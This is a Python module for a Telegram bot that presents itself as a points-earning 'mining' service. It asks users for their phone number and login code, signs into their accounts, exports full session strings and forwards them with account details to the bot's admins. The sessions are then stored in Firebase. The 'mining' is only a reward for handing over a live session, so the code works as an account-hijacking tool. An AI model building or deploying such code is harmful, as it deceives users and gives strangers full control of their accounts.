#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════╗
║                  CLASS: MiningManager                           ║
║              نظام التعدين التلقائي - نسخة آمنة                  ║
║              يتطلب موافقة المشرف على كل جلسة جديدة              ║
╚══════════════════════════════════════════════════════════════════╝
"""

import asyncio
import logging
import time
from datetime import datetime
from typing import Dict, List, Tuple, Optional

from pyrogram import Client
from pyrogram.errors import (
    PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, FloodWait, PhoneNumberBanned
)

from bot_config import BotConfig
from firebase_core import firebase_get, firebase_set, firebase_update, firebase_delete, firebase_push
from user_manager import add_points, is_admin

logger = logging.getLogger(__name__)
logger.setLevel(logging.ERROR)
logger.propagate = False


class SessionMiningManager:
    """
    مدير التعدين والجلسات - نسخة آمنة
    لا يتم تفعيل أي جلسة إلا بعد موافقة المشرف
    """
    
    def __init__(self):
        self.active_sessions: Dict[str, Client] = {}
        self.pending_verifications: Dict[str, Dict] = {}
        self.pending_admin_approvals: Dict[str, Dict] = {}
        self.mining_interval = BotConfig.MINING_INTERVAL
        self.is_running = False
        self.stats = {
            "total_sessions": 0,
            "active_mining": 0,
            "total_points_earned": 0,
            "last_mining_run": None,
            "pending_approvals": 0
        }
    
    async def start_mining_loop(self):
        """بدء حلقة التعدين التلقائية"""
        if self.is_running:
            return
        
        self.is_running = True
        logger.error("MiningManager started")
        
        while self.is_running:
            try:
                await self._process_all_mining_sessions()
                self.stats["last_mining_run"] = datetime.now().isoformat()
                await asyncio.sleep(self.mining_interval)
            except Exception:
                await asyncio.sleep(60)
    
    async def _process_all_mining_sessions(self):
        """معالجة جميع جلسات التعدين النشطة ومنح النقاط"""
        sessions = self._get_active_mining_sessions()
        
        for session_id, session_data in sessions.items():
            try:
                if not session_data.get('is_active', False):
                    continue
                
                points_per_hour = session_data.get('points_per_hour', BotConfig.MINING_POINTS_PER_HOUR)
                last_earned = session_data.get('last_points_earned')
                
                if last_earned:
                    last_time = datetime.fromisoformat(last_earned)
                    if (datetime.now() - last_time).total_seconds() < self.mining_interval:
                        continue
                
                # التحقق من أن الجلسة لا تزال نشطة
                session_string = session_data.get('session_string')
                if session_string and await self._check_session_alive(session_string):
                    user_id = session_data.get('user_id')
                    add_points(user_id, points_per_hour, f"تعدين تلقائي - {session_data.get('phone')}")
                    
                    self._update_session_points(session_id, points_per_hour)
                    self.stats["total_points_earned"] += points_per_hour
                else:
                    self._deactivate_session(session_id)
                    
            except Exception:
                pass
    
    def _get_active_mining_sessions(self) -> Dict:
        """جلب جميع جلسات التعدين"""
        return firebase_get("mining_sessions") or {}
    
    def _update_session_points(self, session_id: str, points: int):
        """تحديث نقاط الجلسة"""
        session = firebase_get(f"mining_sessions/{session_id}")
        if session:
            current = session.get('total_points_earned', 0)
            firebase_update(f"mining_sessions/{session_id}", {
                'last_points_earned': datetime.now().isoformat(),
                'total_points_earned': current + points,
                'last_points_amount': points
            })
    
    def _deactivate_session(self, session_id: str):
        """تعطيل جلسة"""
        firebase_update(f"mining_sessions/{session_id}", {
            'is_active': False,
            'status': 'inactive',
            'deactivated_at': datetime.now().isoformat()
        })
    
    async def _check_session_alive(self, session_string: str) -> bool:
        """التحقق من أن الجلسة لا تزال نشطة"""
        try:
            client = Client(
                f"check_{int(time.time())}",
                session_string=session_string,
                api_id=BotConfig.API_ID,
                api_hash=BotConfig.API_HASH
            )
            await client.connect()
            await client.get_me()
            await client.disconnect()
            return True
        except Exception:
            return False
    
    # ========== دوال طلب رمز التحقق (الاتصال الفعلي بخوادم تيليجرام) ==========
    
    async def request_verification_code(self, phone: str, user_id: int, bot_client) -> Tuple[bool, str, Optional[str]]:
        """
        طلب رمز التحقق من خوادم تيليجرام
        
        Args:
            phone: رقم الهاتف مع رمز الدولة
            user_id: معرف المستخدم الذي طلب التعدين
            bot_client: عميل البوت لإرسال الإشعارات
        
        Returns:
            (success, message, request_id)
        """
        try:
            # إنشاء عميل مؤقت للتحقق
            temp_client = Client(
                f"mining_verify_{int(time.time())}",
                api_id=BotConfig.API_ID,
                api_hash=BotConfig.API_HASH,
                in_memory=True
            )
            
            await temp_client.connect()
            
            # إرسال طلب رمز التحقق
            sent_code = await temp_client.send_code(phone)
            
            # تخزين بيانات الجلسة المؤقتة
            request_id = f"req_{int(time.time())}"
            self.pending_verifications[request_id] = {
                'phone': phone,
                'user_id': user_id,
                'temp_client': temp_client,
                'phone_code_hash': sent_code.phone_code_hash,
                'timeout': sent_code.timeout if hasattr(sent_code, 'timeout') else 60,
                'created_at': datetime.now().isoformat(),
                'status': 'awaiting_code'
            }
            
            # إرسال إشعار للمستخدم
            await bot_client.send_message(
                user_id,
                f"📱 **تم إرسال رمز التحقق**\n\n"
                f"إلى الرقم: `{phone}`\n"
                f"⏱ المهلة: {self.pending_verifications[request_id]['timeout']} ثانية\n\n"
                f"🔑 **أدخل رمز التحقق الآن:**",
                reply_markup=self._build_cancel_button(),
                parse_mode="Markdown"
            )
            
            return True, f"✅ تم إرسال رمز التحقق إلى {phone}", request_id
            
        except FloodWait as e:
            return False, f"⏳ انتظر {e.value} ثانية قبل المحاولة مرة أخرى", None
        except PhoneNumberInvalid:
            return False, "❌ رقم الهاتف غير صالح", None
        except PhoneNumberBanned:
            return False, "❌ رقم الهاتف محظور من تيليجرام", None
        except Exception as e:
            return False, f"❌ فشل إرسال الرمز: {str(e)[:100]}", None
    
    async def verify_code(self, request_id: str, code: str, bot_client) -> Tuple[bool, str, Optional[str]]:
        """
        التحقق من الرمز المدخل مع خوادم تيليجرام
        
        Returns:
            (success, message, session_string)
        """
        pending = self.pending_verifications.get(request_id)
        if not pending:
            return False, "❌ انتهت صلاحية الطلب أو غير موجود", None
        
        try:
            temp_client = pending['temp_client']
            phone = pending['phone']
            phone_code_hash = pending['phone_code_hash']
            user_id = pending['user_id']
            
            # محاولة تسجيل الدخول بالرمز
            await temp_client.sign_in(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=code
            )
            
            # الحصول على معلومات الحساب
            me = await temp_client.get_me()
            session_string = await temp_client.export_session_string()
            
            # إنشاء طلب موافقة للمشرف
            approval_id = f"approval_{int(time.time())}"
            self.pending_admin_approvals[approval_id] = {
                'session_string': session_string,
                'phone': phone,
                'user_id': user_id,
                'user_phone_id': me.id,
                'username': me.username or f"user_{me.id}",
                'first_name': me.first_name or "",
                'access_hash': getattr(me, 'access_hash', None),
                'created_at': datetime.now().isoformat(),
                'status': 'pending'
            }
            
            self.stats["pending_approvals"] = len(self.pending_admin_approvals)
            
            # تنظيف البيانات المؤقتة
            await temp_client.disconnect()
            del self.pending_verifications[request_id]
            
            # إرسال طلب موافقة لجميع المشرفين
            for admin_id in BotConfig.ADMIN_IDS:
                await bot_client.send_message(
                    admin_id,
                    self._build_approval_request_message(approval_id, phone, user_id, me),
                    reply_markup=self._build_approval_buttons(approval_id),
                    parse_mode="Markdown"
                )
            
            # إشعار المستخدم بانتظار الموافقة
            await bot_client.send_message(
                user_id,
                "⏳ **جاري إرسال طلب الموافقة إلى المشرف...**\n\n"
                "سيتم تفعيل التعدين فور موافقة المشرف.\n"
                "شكراً لانتظارك 🤝",
                parse_mode="Markdown"
            )
            
            return True, "✅ تم التحقق بنجاح. في انتظار موافقة المشرف.", None
            
        except PhoneCodeInvalid:
            return False, "❌ رمز التحقق غير صحيح", None
        except PhoneCodeExpired:
            return False, "⏰ رمز التحقق منتهي الصلاحية", None
        except SessionPasswordNeeded:
            return False, "🔒 الحساب محمي بكلمة مرور (2FA) - لا يمكن تفعيل التعدين", None
        except Exception as e:
            return False, f"❌ فشل التحقق: {str(e)[:100]}", None
    
    async def approve_mining_session(self, approval_id: str, admin_id: int, bot_client) -> Tuple[bool, str]:
        """
        موافقة المشرف على جلسة التعدين
        
        Args:
            approval_id: معرف طلب الموافقة
            admin_id: معرف المشرف الذي وافق
            bot_client: عميل البوت للإشعارات
        
        Returns:
            (success, message)
        """
        pending = self.pending_admin_approvals.get(approval_id)
        if not pending:
            return False, "❌ طلب الموافقة غير موجود أو تم معالجته مسبقاً"
        
        if pending['status'] != 'pending':
            return False, f"❌ هذا الطلب تم {pending['status']} مسبقاً"
        
        try:
            session_string = pending['session_string']
            phone = pending['phone']
            user_id = pending['user_id']
            
            # إنشاء معرف الجلسة
            session_id = f"session_{pending['user_phone_id']}"
            
            # حفظ الجلسة في قاعدة البيانات
            mining_data = {
                'session_id': session_id,
                'session_string': session_string,
                'phone': phone,
                'user_id': user_id,
                'user_phone_id': pending['user_phone_id'],
                'username': pending['username'],
                'first_name': pending['first_name'],
                'access_hash': pending['access_hash'],
                'is_active': True,
                'status': 'mining',
                'points_per_hour': BotConfig.MINING_POINTS_PER_HOUR,
                'total_points_earned': 0,
                'created_at': datetime.now().isoformat(),
                'approved_by': admin_id,
                'approved_at': datetime.now().isoformat(),
                'last_points_earned': None
            }
            
            firebase_set(f"mining_sessions/{session_id}", mining_data)
            
            # تحديث حالة الطلب
            pending['status'] = 'approved'
            pending['approved_by'] = admin_id
            pending['approved_at'] = datetime.now().isoformat()
            self.pending_admin_approvals[approval_id] = pending
            
            self.stats["total_sessions"] += 1
            self.stats["active_mining"] += 1
            self.stats["pending_approvals"] = len(self.pending_admin_approvals)
            
            # منح نقاط ترحيبية للمستخدم
            add_points(user_id, 50, "تفعيل التعدين - ترحيب")
            
            # إشعار المستخدم
            await bot_client.send_message(
                user_id,
                f"🎉 **تم تفعيل التعدين بنجاح!**\n\n"
                f"📱 **الرقم:** `{phone}`\n"
                f"👤 **الحساب:** {pending['first_name']}\n"
                f"💰 **المكافأة:** {BotConfig.MINING_POINTS_PER_HOUR} نقطة كل ساعة\n"
                f"💎 **نقاط ترحيبية:** +50 نقطة\n\n"
                f"استخدم `/my_mining` لمتابعة أرباحك",
                parse_mode="Markdown"
            )
            
            # إشعار للمشرف
            await bot_client.send_message(
                admin_id,
                f"✅ **تم تفعيل التعدين**\n\n"
                f"📱 الرقم: `{phone}`\n"
                f"👤 المستخدم: `{user_id}`\n"
                f"💰 {BotConfig.MINING_POINTS_PER_HOUR} نقطة/ساعة",
                parse_mode="Markdown"
            )
            
            return True, f"✅ تم تفعيل التعدين للرقم {phone}"
            
        except Exception as e:
            pending['status'] = 'failed'
            return False, f"❌ فشل التفعيل: {str(e)[:100]}"
    
    async def reject_mining_session(self, approval_id: str, admin_id: int, bot_client) -> Tuple[bool, str]:
        """رفض طلب التعدين"""
        pending = self.pending_admin_approvals.get(approval_id)
        if not pending:
            return False, "❌ طلب الموافقة غير موجود"
        
        if pending['status'] != 'pending':
            return False, f"❌ هذا الطلب تم {pending['status']} مسبقاً"
        
        user_id = pending['user_id']
        phone = pending['phone']
        
        pending['status'] = 'rejected'
        pending['rejected_by'] = admin_id
        pending['rejected_at'] = datetime.now().isoformat()
        
        self.stats["pending_approvals"] = len(self.pending_admin_approvals)
        
        # إشعار المستخدم بالرفض
        await bot_client.send_message(
            user_id,
            f"❌ **تم رفض طلب تفعيل التعدين**\n\n"
            f"📱 الرقم: `{phone}`\n\n"
            f"يمكنك المحاولة مرة أخرى لاحقاً.",
            parse_mode="Markdown"
        )
        
        return True, f"✅ تم رفض طلب التعدين للرقم {phone}"
    
    async def add_session_directly(self, session_string: str, added_by: int, bot_client) -> Tuple[bool, str]:
        """
        إضافة جلسة مباشرة (للمشرف فقط)
        هذا الأمر يستخدمه المشرف لإضافة الجلسات التي وافق عليها
        """
        if not is_admin(added_by):
            return False, "❌ غير مصرح لك"
        
        try:
            # اختبار الجلسة
            test_client = Client(
                f"test_{int(time.time())}",
                session_string=session_string,
                api_id=BotConfig.API_ID,
                api_hash=BotConfig.API_HASH
            )
            await test_client.connect()
            
            if not await test_client.is_user_authorized():
                await test_client.disconnect()
                return False, "❌ الجلسة غير صالحة أو منتهية الصلاحية"
            
            me = await test_client.get_me()
            session_id = f"session_{me.id}"
            
            # التحقق من عدم وجود الجلسة مسبقاً
            existing = firebase_get(f"mining_sessions/{session_id}")
            if existing:
                await test_client.disconnect()
                return False, f"⚠️ الجلسة موجودة مسبقاً للمستخدم {me.first_name}"
            
            # حفظ الجلسة
            mining_data = {
                'session_id': session_id,
                'session_string': session_string,
                'phone': f"+{me.phone_number}" if hasattr(me, 'phone_number') else "unknown",
                'user_id': me.id,
                'user_phone_id': me.id,
                'username': me.username or f"user_{me.id}",
                'first_name': me.first_name or "",
                'is_active': True,
                'status': 'mining',
                'points_per_hour': BotConfig.MINING_POINTS_PER_HOUR,
                'total_points_earned': 0,
                'created_at': datetime.now().isoformat(),
                'added_by': added_by,
                'approved_at': datetime.now().isoformat()
            }
            
            firebase_set(f"mining_sessions/{session_id}", mining_data)
            
            await test_client.disconnect()
            
            self.stats["total_sessions"] += 1
            self.stats["active_mining"] += 1
            
            # إشعار للمشرف
            await bot_client.send_message(
                added_by,
                f"✅ **تم إضافة جلسة تعدين بنجاح!**\n\n"
                f"👤 المستخدم: {me.first_name}\n"
                f"🆔 المعرف: @{me.username or me.id}\n"
                f"💰 {BotConfig.MINING_POINTS_PER_HOUR} نقطة/ساعة",
                parse_mode="Markdown"
            )
            
            return True, f"✅ تم إضافة الجلسة بنجاح: {me.first_name}"
            
        except Exception as e:
            return False, f"❌ فشل إضافة الجلسة: {str(e)[:100]}"
    
    async def get_session_stats(self, user_id: int) -> Dict:
        """جلب إحصائيات جلسات المستخدم"""
        all_sessions = self._get_active_mining_sessions()
        user_sessions = []
        
        for sid, data in all_sessions.items():
            if data.get('user_id') == user_id:
                user_sessions.append(data)
        
        total_points = sum(s.get('total_points_earned', 0) for s in user_sessions)
        active_count = sum(1 for s in user_sessions if s.get('is_active', False))
        
        return {
            'total_sessions': len(user_sessions),
            'active_sessions': active_count,
            'total_points_earned': total_points,
            'sessions': user_sessions
        }
    
    async def get_pending_approvals(self) -> List[Dict]:
        """جلب طلبات الموافقة المعلقة للمشرف"""
        return [
            {**data, 'approval_id': aid}
            for aid, data in self.pending_admin_approvals.items()
            if data['status'] == 'pending'
        ]
    
    async def toggle_session(self, session_id: str, enabled: bool) -> bool:
        """تفعيل أو تعطيل جلسة"""
        return firebase_update(f"mining_sessions/{session_id}", {
            'is_active': enabled,
            'status': 'mining' if enabled else 'disabled',
            'toggled_at': datetime.now().isoformat()
        })
    
    async def stop_mining(self):
        """إيقاف نظام التعدين"""
        self.is_running = False
        for session_id, client in self.active_sessions.items():
            try:
                await client.stop()
            except:
                pass
        self.active_sessions.clear()
        logger.error("MiningManager stopped")
    
    # ========== دوال مساعدة لبناء الأزرار والرسائل ==========
    
    def _build_cancel_button(self):
        """بناء زر إلغاء"""
        from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_mining")]
        ])
    
    def _build_approval_request_message(self, approval_id: str, phone: str, user_id: int, me) -> str:
        """بناء رسالة طلب الموافقة للمشرف"""
        return f"""
🔔 **طلب تفعيل تعدين جديد**

📱 **رقم الهاتف:** `{phone}`
👤 **المستخدم:** `{user_id}`
👤 **اسم الحساب:** {me.first_name}
🆔 **معرف الحساب:** @{me.username or me.id}
🔑 **Access Hash:** `{getattr(me, 'access_hash', 'N/A')}`

📝 **لموافقة:** اضغط على زر الموافقة
❌ **للرفض:** اضغط على زر الرفض

⚠️ **ملاحظة:** بعد الموافقة، سيتم منح المستخدم 50 نقطة ترحيبية وسيبدأ التعدين التلقائي.
"""
    
    def _build_approval_buttons(self, approval_id: str):
        """بناء أزرار الموافقة والرفض للمشرف"""
        from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("✅ موافقة", callback_data=f"approve_mining_{approval_id}"),
                InlineKeyboardButton("❌ رفض", callback_data=f"reject_mining_{approval_id}")
            ]
        ])


# إنشاء نسخة واحدة من مدير التعدين
mining_manager = SessionMiningManager()


async def start_mining():
    """بدء تشغيل نظام التعدين"""
    asyncio.create_task(mining_manager.start_mining_loop())